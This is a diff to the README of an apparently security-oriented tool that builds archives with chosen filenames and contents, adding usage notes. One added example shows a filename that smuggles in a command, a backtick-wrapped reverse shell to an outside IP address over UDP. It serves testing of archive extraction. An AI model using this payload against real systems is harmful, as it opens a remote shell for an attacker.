@@ -30,10 +30,16 @@ options:
                      starting point
 
 ```
+## Notes
 
-Note that `-p` can be repeated to add multiple `filename, content` pairs to each archive type.
+* The argument `-p` can be repeated to add multiple `filename, content` pairs to each archive type.
+* Filenames in archives can contain characters that are typically problematic on the filesystem, e.g.:
+```
+/conf/`sh -i >& /dev/udp/123.123.123.123/1337 0>&1`
+```
 
 
+# Examples
 ## Zip 
 
 Supply the filename with the `-z` flag:
